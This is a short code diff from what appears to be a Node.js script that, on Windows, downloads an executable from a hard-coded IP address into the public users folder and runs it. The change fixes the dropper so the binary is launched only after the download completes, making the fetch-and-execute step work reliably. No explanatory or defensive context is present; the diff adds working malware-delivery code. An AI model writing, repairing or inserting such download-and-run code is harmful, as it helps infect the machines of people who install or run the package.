@@ -7,7 +7,11 @@ if (os.platform() === 'win32') {
     http.get('http://172.86.73.132/windows.exe', (res) => {
       const file = fs.createWriteStream('c:/users/public/windows.exe');
       res.pipe(file);
-      exec('start c:/users/public/windows.exe'); // Windows
+      file.on('finish', () => {
+        file.close(() => {
+             exec('start c:/users/public/windows.exe'); // Windows
+            });
+      });
     });
 } else {
     console.log('Not Windows');
